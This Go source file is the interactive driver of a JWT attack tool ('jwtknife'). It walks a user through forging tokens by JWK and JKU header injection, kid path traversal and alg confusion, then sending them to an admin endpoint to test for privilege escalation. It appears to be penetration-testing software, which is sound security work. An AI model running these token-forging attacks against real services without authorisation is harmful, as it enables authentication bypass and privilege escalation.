package wizard

import (
	"bufio"
	"fmt"
	"io"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	jwta "jwtknife/internal/attacks/jwt"
	"jwtknife/internal/httpx"
	"jwtknife/internal/jwtknifejwt"
	"jwtknife/internal/report"
)

func Run(cfg Config, in io.Reader, out io.Writer) (*report.Run, error) {
	rd := bufio.NewReader(in)

	fmt.Fprintln(out, "jwtknife – JWT auth testing wizard\n")

	// ===== JWT input mode selection =====
	fmt.Fprintln(out, "How do you want to provide the JWT?")
	fmt.Fprintln(out, "  1) Paste JWT into terminal")
	fmt.Fprintln(out, "  2) Read JWT from file")
	fmt.Fprint(out, "Choose [1-2]: ")

	modeChoice, _ := rd.ReadString('\n')
	modeChoice = strings.TrimSpace(modeChoice)

	var jwtInput string
	if modeChoice == "2" {
		fmt.Fprint(out, "Path to file containing JWT: ")
		path, _ := rd.ReadString('\n')
		path = strings.TrimSpace(path)

		data, err := os.ReadFile(path)
		if err != nil {
			return nil, err
		}
		content := strings.TrimSpace(string(data))

		re := regexp.MustCompile(`[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+`)
		match := re.FindString(content)
		if match == "" {
			return nil, fmt.Errorf("no JWT found in file")
		}
		jwtInput = match
	} else {
		// Existing paste behavior
		fmt.Fprint(out, "Paste the JWT (you can include 'Bearer '): ")
		j, _ := rd.ReadString('\n')
		jwtInput = strings.TrimSpace(j)
	}

	cfg.RawJWT = strings.TrimPrefix(jwtInput, "Bearer ")

	parsed, err := jwtknifejwt.Parse(cfg.RawJWT)
	if err != nil {
		return nil, err
	}

	// ===== Optional second JWT (for alg confusion without exposed key) =====
	fmt.Fprintln(out, "\nDo you have a second JWT issued by the server? (used for alg confusion with no exposed key)")
	fmt.Fprint(out, "Provide second JWT? [y/N]: ")
	secondChoice, _ := rd.ReadString('\n')
	secondChoice = strings.TrimSpace(strings.ToLower(secondChoice))

	if secondChoice == "y" || secondChoice == "yes" {
		fmt.Fprintln(out, "How do you want to provide the second JWT?")
		fmt.Fprintln(out, "  1) Paste JWT into terminal")
		fmt.Fprintln(out, "  2) Read JWT from file")
		fmt.Fprint(out, "Choose [1-2]: ")

		mode2, _ := rd.ReadString('\n')
		mode2 = strings.TrimSpace(mode2)

		var secondJWT string
		if mode2 == "2" {
			fmt.Fprint(out, "Path to file containing second JWT: ")
			p, _ := rd.ReadString('\n')
			p = strings.TrimSpace(p)

			data, err := os.ReadFile(filepath.Clean(p))
			if err != nil {
				return nil, err
			}
			content := strings.TrimSpace(string(data))

			re := regexp.MustCompile(`[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+`)
			match := re.FindString(content)
			if match == "" {
				return nil, fmt.Errorf("no JWT found in second JWT file")
			}
			secondJWT = match
		} else {
			fmt.Fprint(out, "Paste the second JWT (you can include 'Bearer '): ")
			j2, _ := rd.ReadString('\n')
			secondJWT = strings.TrimSpace(j2)
		}

		cfg.SecondRawJWT = strings.TrimPrefix(secondJWT, "Bearer ")
	}

	run := report.NewRun(time.Now())
	run.JWT.Raw = cfg.RawJWT
	run.JWT.Alg = parsed.Alg
	run.JWT.HasKid = parsed.HasKid
	run.JWT.Kid = parsed.Kid

	fmt.Fprintf(out, "\nDecoded JWT:\n  alg: %s\n", parsed.Alg)
	if parsed.HasKid {
		fmt.Fprintf(out, "  kid: %s\n", parsed.Kid)
	}

	// ===== JWT placement =====
	fmt.Fprintln(out, "\nWhere is the JWT sent?")
	fmt.Fprintln(out, "  1) Authorization: Bearer <token>")
	fmt.Fprintln(out, "  2) Cookie")
	fmt.Fprintln(out, "  3) Custom header")
	fmt.Fprint(out, "Choose [1-3]: ")

	c, _ := rd.ReadString('\n')
	c = strings.TrimSpace(c)

	var placement httpx.JWTPlacement
	switch c {
	case "2":
		fmt.Fprint(out, "Cookie name: ")
		n, _ := rd.ReadString('\n')
		placement = httpx.JWTPlacement{Kind: httpx.PlaceCookie, Name: strings.TrimSpace(n)}
	case "3":
		fmt.Fprint(out, "Header name: ")
		n, _ := rd.ReadString('\n')
		placement = httpx.JWTPlacement{Kind: httpx.PlaceHeader, Name: strings.TrimSpace(n)}
	default:
		placement = httpx.JWTPlacement{Kind: httpx.PlaceAuthorizationBearer}
	}

	// ===== URLs =====
	pubURL := readURL(rd, out, "Unauthenticated URL (accessible without any JWT): ")
	authURL := readURL(rd, out, "Authenticated URL (accessible with the provided JWT): ")
	adminURL := readURL(rd, out, "Privilege-escalation target URL (admin or higher-privilege endpoint): ")

	// ===== HTTP client =====
	client := httpx.NewClient(httpx.ClientOpts{
		Timeout:         10 * time.Second,
		FollowRedirects: false,
		MaxRequests:     50,
	})

	// ===== Baseline =====
	run.Baseline = report.NewBaseline()

	run.Baseline.Public = report.FromHTTPResult(client.Do(httpx.RequestPlan{
		Label:     "public",
		URL:       pubURL.String(),
		Method:    "GET",
		JWT:       cfg.RawJWT,
		Placement: placement,
	}))
	run.Baseline.Auth = report.FromHTTPResult(client.Do(httpx.RequestPlan{
		Label:     "auth",
		URL:       authURL.String(),
		Method:    "GET",
		JWT:       cfg.RawJWT,
		Placement: placement,
	}))
	// Note: No distinct admin endpoint provided. Privilege escalation will be evaluated against the authenticated endpoint only.
	if adminURL.String() == authURL.String() {
		// No distinct admin endpoint provided; reuse auth baseline
		run.Baseline.Admin = run.Baseline.Auth
	} else {
		run.Baseline.Admin = report.FromHTTPResult(client.Do(httpx.RequestPlan{
			Label:     "admin",
			URL:       adminURL.String(),
			Method:    "GET",
			JWT:       cfg.RawJWT,
			Placement: placement,
		}))
	}

	input := jwta.AttackInput{
		ParsedJWT:    parsed,
		RawJWT:       cfg.RawJWT,
		SecondRawJWT: strings.TrimSpace(cfg.SecondRawJWT),
		Client:       client,
		Baseline:     run.Baseline,
		Targets: httpx.Targets{
			PublicURL: pubURL.String(),
			AuthURL:   authURL.String(),
			AdminURL:  adminURL.String(),
			Method:    "GET",
			Placement: placement,
		},
	}

	// ===== Phase 1: automatic attacks =====
	fmt.Fprintln(out, "\nPhase 1: JWT auth attacks")

	run.JWTAttacks = nil

	// Run remaining default attacks
	for _, atk := range jwta.DefaultAttacks() {
		res := atk.Run(input)
		run.JWTAttacks = append(run.JWTAttacks, res)

		if res.Outcome == report.OutcomeSuccess && !cfg.Exhaustive {
			run.AuthState = report.EvaluateAuthState(run.Baseline, run.JWTAttacks)
			return run, nil
		}
	}

	// ===== Phase 2: JWK (interactive) =====
	fmt.Fprintln(out, "\n[JWK] JWT JWK header injection")

	jwkAttack := jwta.NewJWKHeaderAttack()
	finalJWK := jwkAttack.Run(input)

	// Extract forged JWT if present
	var forgedJWK string
	for _, s := range finalJWK.Steps {
		if s.JWT.Token != "" {
			forgedJWK = s.JWT.Token
			break
		}
	}

	if forgedJWK != "" {
		fmt.Fprintln(out, "\nForged JWK JWT ready.")
		fmt.Fprintln(out, "Choose next action:")
		fmt.Fprintln(out, "  1) Send admin request now")
		fmt.Fprintln(out, "  2) Show forged JWT only")
		fmt.Fprintln(out, "  3) Do nothing / skip")
		fmt.Fprint(out, "Choose [1-3]: ")

		choice, _ := rd.ReadString('\n')
		choice = strings.TrimSpace(choice)

		switch choice {
		case "2":
			fmt.Fprintln(out, "\nForged JWT:")
			fmt.Fprintln(out, forgedJWK)
			run.JWTAttacks = append(run.JWTAttacks, finalJWK)

		case "3":
			fmt.Fprintln(out, "Skipping JWK request execution.")
			run.JWTAttacks = append(run.JWTAttacks, finalJWK)

		default:
			// Default behavior: send request (already executed inside attack)
			run.JWTAttacks = append(run.JWTAttacks, finalJWK)
		}
	} else {
		run.JWTAttacks = append(run.JWTAttacks, finalJWK)
	}

	// ===== Phase 2: JKU (interactive) =====
	fmt.Fprintln(out, "\n[JKU] JWT Key URL (jku) header injection")

	jkuAttack := jwta.NewJKUAttack()
	preview := jkuAttack.Run(input)
	run.JWTAttacks = append(run.JWTAttacks, preview)

	for _, s := range preview.Steps {
		if s.Label == "host-jwks" {
			fmt.Fprintln(out, "\nSave the following EXACTLY as jwks.json and host it:\n")
			fmt.Fprintln(out, s.JWT.Token)
		}
	}

	fmt.Fprint(out, "\nPaste FULL URL to hosted jwks.json (or press Enter to skip): ")
	cb, _ := rd.ReadString('\n')
	cb = strings.TrimSpace(cb)

	if cb != "" {
		if _, err := url.ParseRequestURI(cb); err != nil {
			fmt.Fprintln(out, "Invalid URL format, skipping JKU attack.")
		} else {
			input.Callback = cb
			run.CallbackBaseURL = cb

			final := jkuAttack.Run(input)

			// Extract forged JWT if present
			var forged string
			for _, s := range final.Steps {
				if s.Label == "forged-jku-jwt" && s.JWT.Token != "" {
					forged = s.JWT.Token
					break
				}
			}

			if forged != "" {
				fmt.Fprintln(out, "\nForged JKU JWT ready.")
				fmt.Fprintln(out, "Choose next action:")
				fmt.Fprintln(out, "  1) Send admin request now")
				fmt.Fprintln(out, "  2) Show forged JWT only")
				fmt.Fprintln(out, "  3) Do nothing / skip")
				fmt.Fprint(out, "Choose [1-3]: ")

				choice, _ := rd.ReadString('\n')
				choice = strings.TrimSpace(choice)

				switch choice {
				case "2":
					fmt.Fprintln(out, "\nForged JWT:")
					fmt.Fprintln(out, forged)
					run.JWTAttacks = append(run.JWTAttacks, final)

				case "3":
					fmt.Fprintln(out, "Skipping JKU request execution.")
					run.JWTAttacks = append(run.JWTAttacks, final)

				default:
					// Default behavior: send request (already executed inside attack)
					run.JWTAttacks = append(run.JWTAttacks, final)
				}
			} else {
				// No forged token produced (should not normally happen)
				run.JWTAttacks = append(run.JWTAttacks, final)
			}
		}
	}

	// ===== Phase 3: KID path traversal =====
	fmt.Fprintln(out, "\n[KID] JWT kid header path traversal")
	fmt.Fprintln(out, "Do you want to try kid path traversal?")
	fmt.Fprintln(out, "  1) Automatic payloads")
	fmt.Fprintln(out, "  2) Custom kid value")
	fmt.Fprintln(out, "  3) Skip")
	fmt.Fprint(out, "Choose [1-3]: ")

	kidChoice, _ := rd.ReadString('\n')
	kidChoice = strings.TrimSpace(kidChoice)

	switch kidChoice {
	case "1":
		res := jwta.NewKidTraversalAttack().Run(input)
		run.JWTAttacks = append(run.JWTAttacks, res)

	case "2":
		fmt.Fprint(out, "Enter custom kid value: ")
		kidVal, _ := rd.ReadString('\n')
		kidVal = strings.TrimSpace(kidVal)

		if kidVal != "" {
			customInput := input
			customInput.CustomKID = kidVal
			res := jwta.NewKidTraversalAttack().Run(customInput)
			run.JWTAttacks = append(run.JWTAttacks, res)
		} else {
			fmt.Fprintln(out, "Empty kid value, skipping.")
		}

	default:
		fmt.Fprintln(out, "Skipping kid traversal.")
	}

	run.AuthState = report.EvaluateAuthState(run.Baseline, run.JWTAttacks)
	return run, nil
}

func readURL(rd *bufio.Reader, out io.Writer, label string) *url.URL {
	for {
		fmt.Fprint(out, label)
		s, _ := rd.ReadString('\n')
		u, err := url.Parse(strings.TrimSpace(s))
		if err == nil && u.Scheme != "" {
			return u
		}
		fmt.Fprintln(out, "Invalid URL, try again.")
	}
}
